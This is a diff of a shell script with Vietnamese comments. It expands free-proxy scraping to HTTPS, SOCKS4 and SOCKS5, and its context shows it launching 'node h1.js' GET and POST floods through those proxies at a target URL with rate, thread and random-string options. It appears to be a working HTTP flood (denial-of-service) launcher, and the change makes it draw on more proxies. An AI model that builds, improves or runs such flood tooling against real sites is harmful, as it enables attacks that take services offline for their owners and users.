@@ -15,7 +15,7 @@ tep_tam=$(mktemp)
 tong=0
 
 # Lấy proxy từ các loại HTTP, HTTPS, SOCKS4, SOCKS5
-for loai in http; do 
+for loai in http https socks4 socks5; do 
   lien_ket="https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&ssl=all&timeout=7000&protocol=$loai"
   
   # Tải về và xử lý định dạng (đảm bảo mỗi proxy 1 dòng)
@@ -44,9 +44,6 @@ done
 for method in GET POST; do 
   node h1.js "$method" "$URL" live.txt "$TIME" 128 5 randomstring=true &
 done
-
-
-
 wait
 
 # Dừng tất cả tiến trình liên quan
